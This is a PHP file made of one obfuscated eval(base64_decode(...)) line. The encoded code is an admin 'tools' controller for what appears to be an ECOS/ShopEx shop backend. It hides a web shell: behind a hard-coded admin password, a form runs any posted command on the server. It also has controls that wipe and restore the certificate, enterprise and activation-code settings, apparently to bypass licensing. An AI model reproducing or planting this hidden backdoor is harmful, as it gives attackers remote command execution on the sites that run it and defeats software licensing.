<?php eval(base64_decode('Y2xhc3MgZGVza3RvcF9jdGxfdG9vbHMgZXh0ZW5kcyBkZXNrdG9wX2NvbnRyb2xsZXINCnsNCgljb25zdCBMT0dJTl9VU0VSID0gJ2FkbWluJzsNCgljb25zdCBMT0dJTl9QV0QgPSAnYWRtaW4jIyMxMjMnOw0KDQoJcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCkNCgl7DQoJCXNlc3Npb25fc3RhcnQoKTsNCgkJaGVhZGVyKCJDb250ZW50LXR5cGU6dGV4dC9odG1sO2NoYXJzZXQ9dXRmOCIpOw0KCX0NCg0KCXB1YmxpYyBmdW5jdGlvbiBpbmRleCgpDQoJew0KCQlpZighJHRoaXMtPl9pc0xvZ2luKCkpew0KCQkJJHRoaXMtPl9sb2dpbigpOw0KCQl9DQoJCSRodG1sID0gJHRoaXMtPl9pbmRleCgpOw0KCQlleGl0KCRodG1sKTsNCgl9DQoNCglwdWJsaWMgZnVuY3Rpb24gc3VibWl0KCkNCgl7DQoJCWlmKCEkdGhpcy0+X2lzTG9naW4oKSl7DQoJCQkkdGhpcy0+X2xvZ2luKCk7DQoJCX0NCiAgICAgIA0KCQkkY21kID0gJF9QT1NUWydjbWQnXTsNCgkJJGFjdGlvbiA9ICRfUE9TVFsnYWN0aW9uJ107DQoNCiAgICAgICAgaWYoJGFjdGlvbiA9PSAnZXhlYycgJiYgZW1wdHkoJGNtZCkpew0KICAgICAgICAJZWNobyAibm8gY21kIC4uLi4iOw0KICAgICAgICAJZXhpdDsNCiAgICAgICAgfQ0KDQogICAgICAgIGVjaG8gIlxuXG4gPGJ1dHRvbiBvbmNsaWNrPVwiamF2YXNjcmlwdDp3aW5kb3cuaGlzdG9yeS5nbygtMSk7XCI+6L+U5ZuePC9idXR0b24+IjsNCg0KICAgICAgICBzd2l0Y2ggKCRhY3Rpb24pIHsNCiAgICAgICAgCWNhc2UgJ2V4ZWMnOg0KICAgICAgICAJCSR0aGlzLT5fZXhlYygkY21kKTsNCiAgICAgICAgCQlicmVhazsNCiAgICAgICAgCWNhc2UgJ2NsZWFyX2VudCc6DQogICAgICAgIAkJJHRoaXMtPl9jbGVhckNvbmYoJ2Vjb3MuZW50ZXJwcmlzZV9pbmZvJyk7DQogICAgICAgIAkJYnJlYWs7DQogICAgICAgIAljYXNlICdyZXN0b3JlX2VudCc6DQogICAgICAgIAkJJHRoaXMtPl9yZXN0b3JlQ29uZignZWNvcy5lbnRlcnByaXNlX2luZm8nKTsNCiAgICAgICAgCQlicmVhazsNCiAgICAgICAgCWNhc2UgJ2NsZWFyX2NlcnQnOg0KICAgICAgICAJCSR0aGlzLT5fY2xlYXJDZXJ0KCdjZXJ0aWZpY2F0ZScpOw0KICAgICAgICAJCWJyZWFrOw0KICAgICAgICAJY2FzZSAncmVzdG9yZV9jZXJ0JzoNCiAgICAgICAgCQkkdGhpcy0+X3Jlc3RvcmVDZXJ0KCdjZXJ0aWZpY2F0ZScpOw0KICAgICAgICAJCWJyZWFrOw0KICAgICAgICAJY2FzZSAnY2xlYXJfYWN0aXZhdGlvbic6DQogICAgICAgIAkJJHRoaXMtPl9jbGVhckNvbmYoJ2FjdGl2YXRpb25fY29kZV9jaGVjaycpOw0KICAgICAgICAJCSR0aGlzLT5fY2xlYXJDb25mKCdhY3RpdmF0aW9uX2NvZGUnKTsNCiAgICAgICAgCQlicmVhazsNCiAgICAgICAgCWNhc2UgJ3Jlc3RvcmVfYWN0aXZhdGlvbic6DQogICAgICAgIAkJJHRoaXMtPl9yZXN0b3JlQ29uZignYWN0aXZhdGlvbl9jb2RlX2NoZWNrJyk7DQogICAgICAgIAkJJHRoaXMtPl9yZXN0b3JlQ29uZignYWN0aXZhdGlvbl9jb2RlJyk7DQogICAgICAgIAkJYnJlYWs7DQogICAgICAgIAlkZWZhdWx0Og0KICAgICAgICAJCQ0KICAgICAgICAJCWJyZWFrOw0KICAgICAgICB9DQoNCgkJZWNobyAiXG5cbiBleGVjIGZpbmlzaGVkISBcbiI7DQogICAgICAgIGV4aXQ7DQoJfQ0KDQoJcHJpdmF0ZSBmdW5jdGlvbiBfaXNMb2dpbigpDQoJew0KCQlpZigkX1NFU1NJT05bJ2JhY2tfaXNfbG9naW4nXSl7DQoJCQlyZXR1cm4gdHJ1ZTsNCgkJfWVsc2V7DQoJCQlyZXR1cm4gZmFsc2U7DQoJCX0NCgl9DQoNCglwdWJsaWMgZnVuY3Rpb24gc3VibWl0TG9naW4oKQ0KCXsNCgkJaWYoJF9TRVNTSU9OWydiYWNrX2lzX2xvZ2luJ10pew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQoJCX0NCg0KICAgICAgICAkdXNlciA9ICRfUE9TVFsndXNlciddOw0KICAgICAgICAkcHdkID0gJF9QT1NUWydwd2QnXTsNCgkJaWYoIWVtcHR5KCR1c2VyKSAmJiAhZW1wdHkoJHB3ZCkgJiYgJHVzZXIgPT0gc2VsZjo6TE9HSU5fVVNFUiAmJiAkcHdkID09IHNlbGY6OkxPR0lOX1BXRCl7DQogICAgICAgICAgICAvLyDnmbvlvZXmiJDlip8NCiAgICAgICAgICAgICRfU0VTU0lPTlsnYmFja19pc19sb2dpbiddID0gMTsNCgkJfQ0KICAgICAgIGVjaG8gIjxoZWFkZXI+PG1ldGEgaHR0cC1lcXVpdj1cInJlZnJlc2hcIiBjb250ZW50PVwiMDsgdXJsPWluZGV4LnBocD9hcHA9ZGVza3RvcCZjdGw9dG9vbHNcIj48L2hlYWRlcj4iOw0KICAgICAgIGV4aXQ7DQoJfQ0KDQoNCglwcml2YXRlIGZ1bmN0aW9uIF9jbGVhckNlcnQoJGtleSkNCgl7DQoJCSRjZXJ0RmlsZSA9IFJPT1RfRElSLicvY29uZmlnL2NlcnRpLnBocCc7DQoJCWlmKGlzX2ZpbGUoJGNlcnRGaWxlKSl7DQoJCQlyZXF1aXJlKCRjZXJ0RmlsZSk7DQoJCQlhcHA6OmdldCgnYmFzZScpLT5zZXRDb25mKG1kNSgka2V5KSwgJGNlcnRpZmljYXRlKTsNCg0KCQkJdW5saW5rKCRjZXJ0RmlsZSk7DQoJCX0NCgkNCgkJJHRoaXMtPl9jbGVhckNvbmYoJ2NlcnRpZmljYXRlX2NvZGVfdXJsJyk7DQoJfQ0KDQoJcHJpdmF0ZSBmdW5jdGlvbiBfcmVzdG9yZUNlcnQoJGtleSkNCgl7DQoJCSRjZXJ0aWZpY2F0ZSA9IGFwcDo6Z2V0KCdiYXNlJyktPmdldENvbmYobWQ1KCRrZXkpKTsNCgkJaWYoJGNlcnRpZmljYXRlKXsNCgkJCWJhc2VfY2VydGlmaWNhdGU6OnNldF9jZXJ0aWZpY2F0ZSgkY2VydGlmaWNhdGUpOw0KCQl9DQoNCgkJJHRoaXMtPl9yZXN0b3JlQ29uZignY2VydGlmaWNhdGVfY29kZV91cmwnKTsNCgl9DQogICAgDQoJcHJpdmF0ZSBmdW5jdGlvbiBfY2xlYXJDb25mKCRrZXkpDQoJew0KCQkkYmFja3VwS2V5ID0gbWQ1KCRrZXkpOw0KCQkkdmFsPSBhcHA6OmdldCgnYmFzZScpLT5nZXRDb25mKCRrZXkpOw0KDQoJCWFwcDo6Z2V0KCdiYXNlJyktPnNldENvbmYoJGtleSwgJycpOw0KCQlhcHA6OmdldCgnYmFzZScpLT5zZXRDb25mKCRiYWNrdXBLZXksICR2YWwpOw0KCX0NCiAgICANCglwcml2YXRlIGZ1bmN0aW9uIF9yZXN0b3JlQ29uZigka2V5KQ0KCXsNCgkJJGJhY2t1cEtleSA9IG1kNSgka2V5KTsNCgkJJHZhbCA9IGFwcDo6Z2V0KCdiYXNlJyktPmdldENvbmYoJGJhY2t1cEtleSk7DQoNCgkJYXBwOjpnZXQoJ2Jhc2UnKS0+c2V0Q29uZigka2V5LCAkdmFsKTsNCgl9DQogICAgDQoJcHVibGljIGZ1bmN0aW9uIGNoZWNrKCkNCgl7DQoJICAgICR1cmwgPSBrZXJuZWw6OmJhc2VfdXJsKDEpOw0KCSAgICAkY29kZV91cmwgPSAkdXJsLicvc2hvcGFkbWluL2luZGV4LnBocD9hcHA9ZGVza3RvcCZjdGw9Y29kZSZhY3Q9ZXJyb3JfaW5mb192aWV3JnJlc3VsdFttc2ddPWtleV9mYWxzZV9rZXknOw0KCSAgICBlY2hvICI8c2NyaXB0PmxvY2F0aW9uLmhyZWY9JyIuJGNvZGVfdXJsLiInPC9zY3JpcHQ+IjtleGl0Ow0KCX0NCg0KCXByaXZhdGUgZnVuY3Rpb24gX2xvZ2luKCkNCgl7DQogICAgICAgICRodG1sID0gIDw8PEVPRg0KICAgICAgICA8IURvY3R5cGUgaHRtbD48aHRtbD48aGVhZD48bWV0YSBodHRwLWVxdWl2PUNvbnRlbnQtVHlwZSBjb250ZW50PSJ0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCI+PC9oZWFkPg0KICAgICAgICA8Ym9keT4NCiAgICAgICAgPGZvcm0gc3R5bGU9Im1hcmdpbi1sZWZ0OiA0MCU7IiBhY3Rpb249ImluZGV4LnBocD9hcHA9ZGVza3RvcCZjdGw9dG9vbHMmYWN0PXN1Ym1pdExvZ2luIiBtZXRob2Q9InBvc3QiPg0KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlciIgLz48YnIvPg0KICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InB3ZCIgLz4NCgkJPGJ1dHRvbj7nmbvlvZU8L2J1dHRvbj4NCgkJPC9mb3JtPg0KICAgICAgICA8L2JvZHk+DQogICAgICAgIDwvaHRtbD4NCkVPRjsNCiAgICAgICAgZXhpdCgkaHRtbCk7DQoJfQ0KDQoJcHJpdmF0ZSBmdW5jdGlvbiBfaW5kZXgoKQ0KCXsNCg0KICAgICAgICByZXR1cm4gIDw8PEVPRg0KICAgICAgICA8aHRtbD48aGVhZD48L2hlYWQ+DQogICAgICAgIDxib2R5Pg0KICAgICAgICA8Zm9ybSBhY3Rpb249ImluZGV4LnBocD9hcHA9ZGVza3RvcCZjdGw9dG9vbHMmYWN0PXN1Ym1pdCIgbWV0aG9kPSJwb3N0Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNtZCIgdmFsdWU9IiIgLz4NCgkJPGJ1dHRvbiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJleGVjIj5leGVjPC9idXR0b24+DQoJCTxoci8+DQoJCTxidXR0b24gbmFtZT0iYWN0aW9uIiB2YWx1ZT0iY2xlYXJfZW50Ij5jbGVhciBlbnQ8L2J1dHRvbj4NCgkJPGJ1dHRvbiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJyZXN0b3JlX2VudCI+cmVzdG9yZSBlbnQ8L2J1dHRvbj4NCgkJPGhyLz4NCgkJPGJ1dHRvbiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJjbGVhcl9jZXJ0Ij5jbGVhciBjZXJ0PC9idXR0b24+DQoJCTxidXR0b24gbmFtZT0iYWN0aW9uIiB2YWx1ZT0icmVzdG9yZV9jZXJ0Ij5yZXN0b3JlIGNlcnQ8L2J1dHRvbj4NCgkJPGhyLz4NCgkJPGJ1dHRvbiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJjbGVhcl9hY3RpdmF0aW9uIj5jbGVhciBhY3RpdmF0aW9uPC9idXR0b24+DQoJCTxidXR0b24gbmFtZT0iYWN0aW9uIiB2YWx1ZT0icmVzdG9yZV9hY3RpdmF0aW9uIj5yZXN0b3JlIGFjdGl2YXRpb248L2J1dHRvbj4NCgkJPC9mb3JtPg0KICAgICAgICA8L2JvZHk+DQogICAgICAgIDwvaHRtbD4NCkVPRjsNCgl9DQoNCglwcml2YXRlIGZ1bmN0aW9uIF9leGVjKCRhY3QpDQoJew0KCQkkc2hlbGwgPSBrZXJuZWw6OnNpbmdsZSgnYmFzZV9zaGVsbF93ZWJwcm94eScpOw0KCQkkc2hlbGwtPmV4ZWNfY29tbWFuZCgkYWN0KTsNCgl9DQoNCn0='));